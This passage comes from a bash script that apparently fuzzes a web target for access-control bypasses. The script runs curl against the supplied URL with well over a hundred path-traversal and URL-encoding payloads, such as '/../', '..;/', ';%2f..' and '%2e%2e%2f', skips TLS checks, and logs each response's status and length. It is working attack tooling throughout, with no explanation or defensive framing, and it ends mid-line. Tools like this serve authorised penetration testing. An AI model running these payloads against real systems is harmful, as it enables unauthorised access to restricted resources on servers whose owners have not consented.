code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/../" -H "$user_agent")
print
echo -n "Payload [ /../../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/../../" -H "$user_agent")
print
echo -n "Payload [ /../../../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/../../../" -H "$user_agent")
print
echo -n "Payload [ /../../..// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/../../..//" -H "$user_agent")
print
echo -n "Payload [ /../..// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/../..//" -H "$user_agent")
print
echo -n "Payload [ /../..//../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/../..//../" -H "$user_agent")
print
echo -n "Payload [ /../..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/../..;/" -H "$user_agent")
print
echo -n "Payload [ /.././../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/.././../" -H "$user_agent")
print
echo -n "Payload [ /../.;/../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/../.;/../" -H "$user_agent")
print
echo -n "Payload [ /..// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..//" -H "$user_agent")
print
echo -n "Payload [ /..//../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..//../" -H "$user_agent")
print
echo -n "Payload [ /..//../../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..//../../" -H "$user_agent")
print
echo -n "Payload [ /..//..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..//..;/" -H "$user_agent")
print
echo -n "Payload [ /../;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/../;/" -H "$user_agent")
print
echo -n "Payload [ /../;/../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/../;/../" -H "$user_agent")
print
echo -n "Payload [ /..;%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..;%2f" -H "$user_agent")
print
echo -n "Payload [ /..;%2f..;%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..;%2f..;%2f" -H "$user_agent")
print
echo -n "Payload [ /..;%2f..;%2f..;%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..;%2f..;%2f..;%2f" -H "$user_agent")
print
echo -n "Payload [ /..;/../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..;/../" -H "$user_agent")
print
echo -n "Payload [ /..;/..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..;/..;/" -H "$user_agent")
print
echo -n "Payload [ /..;// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..;//" -H "$user_agent")
print
echo -n "Payload [ /..;//../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..;//../" -H "$user_agent")
print
echo -n "Payload [ /..;//..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..;//..;/" -H "$user_agent")
print
echo -n "Payload [ /..;/;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..;/;/" -H "$user_agent")
print
echo -n "Payload [ /..;/;/..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/..;/;/..;/" -H "$user_agent")
print
echo -n "Payload [ /.// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/.//" -H "$user_agent")
print
echo -n "Payload [ /.;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/.;/" -H "$user_agent")
print
echo -n "Payload [ /.;// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/.;//" -H "$user_agent")
print
echo -n "Payload [ //.. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1//.." -H "$user_agent")
print
echo -n "Payload [ //../../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1//../../" -H "$user_agent")
print
echo -n "Payload [ //..; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1//..;" -H "$user_agent")
print
echo -n "Payload [ //./ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1//./" -H "$user_agent")
print
echo -n "Payload [ //.;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1//.;/" -H "$user_agent")
print
echo -n "Payload [ ///.. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1///.." -H "$user_agent")
print
echo -n "Payload [ ///../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1///../" -H "$user_agent")
print
echo -n "Payload [ ///..// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1///..//" -H "$user_agent")
print
echo -n "Payload [ ///..; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1///..;" -H "$user_agent")
print
echo -n "Payload [ ///..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1///..;/" -H "$user_agent")
print
echo -n "Payload [ ///..;// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1///..;//" -H "$user_agent")
print
echo -n "Payload [ //;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1//;/" -H "$user_agent")
print
echo -n "Payload [ /;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/;/" -H "$user_agent")
print
echo -n "Payload [ /;// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/;//" -H "$user_agent")
print
echo -n "Payload [ /;x ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/;x" -H "$user_agent")
print
echo -n "Payload [ /;x/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/;x/" -H "$user_agent")
print
echo -n "Payload [ /x/../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/x/../" -H "$user_agent")
print
echo -n "Payload [ /x/..// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/x/..//" -H "$user_agent")
print
echo -n "Payload [ /x/../;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/x/../;/" -H "$user_agent")
print
echo -n "Payload [ /x/..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/x/..;/" -H "$user_agent")
print
echo -n "Payload [ /x/..;// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/x/..;//" -H "$user_agent")
print
echo -n "Payload [ /x/..;/;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/x/..;/;/" -H "$user_agent")
print
echo -n "Payload [ /x//../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/x//../" -H "$user_agent")
print
echo -n "Payload [ /x//..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/x//..;/" -H "$user_agent")
print
echo -n "Payload [ /x/;/../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/x/;/../" -H "$user_agent")
print
echo -n "Payload [ /x/;/..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/x/;/..;/" -H "$user_agent")
print
echo -n "Payload [ ; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;" -H "$user_agent")
print
echo -n "Payload [ ;%09 ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%09" -H "$user_agent")
print
echo -n "Payload [ ;%09.. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%09.." -H "$user_agent")
print
echo -n "Payload [ ;%09..; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%09..;" -H "$user_agent")
print
echo -n "Payload [ ;%09; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%09;" -H "$user_agent")
print
echo -n "Payload [ ;%2F.. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2F.." -H "$user_agent")
print
echo -n "Payload [ ;%2f%2e%2e ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f%2e%2e" -H "$user_agent")
print
echo -n "Payload [ ;%2f%2e%2e%2f%2e%2e%2f%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f%2f/../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f%2f/../" -H "$user_agent")
print
echo -n "Payload [ ;%2f.. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f.." -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f%2e%2e%2f%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..%2f%2e%2e%2f%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f..%2f%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..%2f..%2f%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..%2f/" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/..%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..%2f/..%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..%2f/../" -H "$user_agent")
print
echo -n "Payload [ ;%2f../%2f..%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f../%2f..%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f../%2f../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f../%2f../" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//..%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..//..%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..//../" -H "$user_agent")
print
echo -n "Payload [ ;%2f../// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..///" -H "$user_agent")
print
echo -n "Payload [ ;%2f..///; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..///;" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..//;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//;/; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..//;/;" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f../;//" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;/;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f../;/;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;/;/; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f../;/;/;" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;/// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..;///" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;//;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..;//;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;/;// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f..;/;//" -H "$user_agent")
print
echo -n "Payload [ ;%2f/%2f../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f/%2f../" -H "$user_agent")
print
echo -n "Payload [ ;%2f//..%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f//..%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f//../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f//../" -H "$user_agent")
print
echo -n "Payload [ ;%2f//..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f//..;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f/;/../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f/;/../" -H "$user_agent")
print
echo -n "Payload [ ;%2f/;/..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f/;/..;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f;//../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f;//../" -H "$user_agent")
print
echo -n "Payload [ ;%2f;/;/..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;%2f;/;/..;/" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/%2e%2e" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e%2f%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/%2e%2e%2f%2f" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e%2f/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/%2e%2e%2f/" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/%2e%2e/" -H "$user_agent")
print
echo -n "Payload [ ;/%2e. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/%2e." -H "$user_agent")
print
echo -n "Payload [ ;/%2f%2f../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/%2f%2f../" -H "$user_agent")
print
echo -n "Payload [ ;/%2f/..%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/%2f/..%2f" -H "$user_agent")
print
echo -n "Payload [ ;/%2f/../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/%2f/../" -H "$user_agent")
print
echo -n "Payload [ ;/.%2e ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/.%2e" -H "$user_agent")
print
echo -n "Payload [ ;/.%2e/%2e%2e/%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/.%2e/%2e%2e/%2f" -H "$user_agent")
print
echo -n "Payload [ ;/.. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/.." -H "$user_agent")
print
echo -n "Payload [ ;/..%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/..%2f" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f%2f../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/..%2f%2f../" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f..%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/..%2f..%2f" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/..%2f/" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/..%2f//" -H "$user_agent")
print
echo -n "Payload [ ;/../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/../" -H "$user_agent")
print
echo -n "Payload [ ;/../%2f/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/../%2f/" -H "$user_agent")
print
echo -n "Payload [ ;/../../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/../../" -H "$user_agent")
print
echo -n "Payload [ ;/../..// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/../..//" -H "$user_agent")
print
echo -n "Payload [ ;/.././../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/.././../" -H "$user_agent")
print
echo -n "Payload [ ;/../.;/../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/../.;/../" -H "$user_agent")
print
echo -n "Payload [ ;/..// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/..//" -H "$user_agent")
print
echo -n "Payload [ ;/..//%2e%2e/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/..//%2e%2e/" -H "$user_agent")
print
echo -n "Payload [ ;/..//%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/..//%2f" -H "$user_agent")
print
echo -n "Payload [ ;/..//../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/..//../" -H "$user_agent")
print
echo -n "Payload [ ;/../// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/..///" -H "$user_agent")
print
echo -n "Payload [ ;/../;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/../;/" -H "$user_agent")
print
echo -n "Payload [ ;/../;/../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/../;/../" -H "$user_agent")
print
echo -n "Payload [ ;/..; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/..;" -H "$user_agent")
print
echo -n "Payload [ ;/.;. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;/.;." -H "$user_agent")
print
echo -n "Payload [ ;//%2f../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;//%2f../" -H "$user_agent")
print
echo -n "Payload [ ;//.. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;//.." -H "$user_agent")
print
echo -n "Payload [ ;//../../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;//../../" -H "$user_agent")
print
echo -n "Payload [ ;///.. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;///.." -H "$user_agent")
print
echo -n "Payload [ ;///../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;///../" -H "$user_agent")
print
echo -n "Payload [ ;///..// ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;///..//" -H "$user_agent")
print
echo -n "Payload [ ;x ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;x" -H "$user_agent")
print
echo -n "Payload [ ;x/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;x/" -H "$user_agent")
print
echo -n "Payload [ ;x; ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1;x;" -H "$user_agent")
print


echo -n "Payload [ & ]: "
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1&" -H "$user_agent")
print
echo -n "Payload [ % ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%" -H "$user_agent")
print
echo -n "Payload [ %09 ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%09" -H "$user_agent")
print
echo -n "Payload [ ../ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1../" -H "$user_agent")
print
echo -n "Payload [ ../%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..%2f" -H "$user_agent")
print
echo -n "Payload [ .././ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1.././" -H "$user_agent")
print
echo -n "Payload [ ..%00/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..%00/" -H "$user_agent")
print
echo -n "Payload [ ..%0d/ ]"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..%0d/" -H "$user_agent")
print
echo -n "Payload [ ..%5c ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..%5c" -H "$user_agent")
print
echo -n "Payload [ ..\ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..\\" -H "$user_agent")
print
echo -n "Payload [ ..%ff/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..%ff" -H "$user_agent")
print
echo -n "Payload [ %2e%2e%2f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%2e%2e%2f" -H "$user_agent")
print
echo -n "Payload [ .%2e/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1.%2e/" -H "$user_agent")
print
echo -n "Payload [ %3f ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%3f" -H "$user_agent")
print
echo -n "Payload [ %26 ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%26" -H "$user_agent")
print
echo -n "Payload [ %23 ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%23" -H "$user_agent")
print
echo -n "Payload [ %2e ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1%2e" -H "$user_agent")
print
echo -n "Payload [ /. ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/." -H "$user_agent")
print
echo -n "Payload [ ? ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1?" -H "$user_agent")
print
echo -n "Payload [ ?? ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1??" -H "$user_agent")
print
echo -n "Payload [ ??? ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1???" -H "$user_agent")
print
echo -n "Payload [ // ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1//" -H "$user_agent")
print
echo -n "Payload [ /./ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/./" -H "$user_agent")
print
echo -n "Payload [ .//./ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1.//./" -H "$user_agent")
print
echo -n "Payload [ //?anything ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1//?anything" -H "$user_agent")
print
echo -n "Payload [ # ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1#" -H "$user_agent")
print
echo -n "Payload [ / ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/" -H "$user_agent")
print
echo -n "Payload [ /.randomstring ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1/.randomstring" -H "$user_agent")
print
echo -n "Payload [ ..;/ ]:"
code=$(curl -sk -o "$outdir/$(date +%s)" -w "Status: %{http_code}, Length: %{size_download}\n" "$1..;/" -H "$user_agent")
print
echo -n "Payload [ .html ]:"
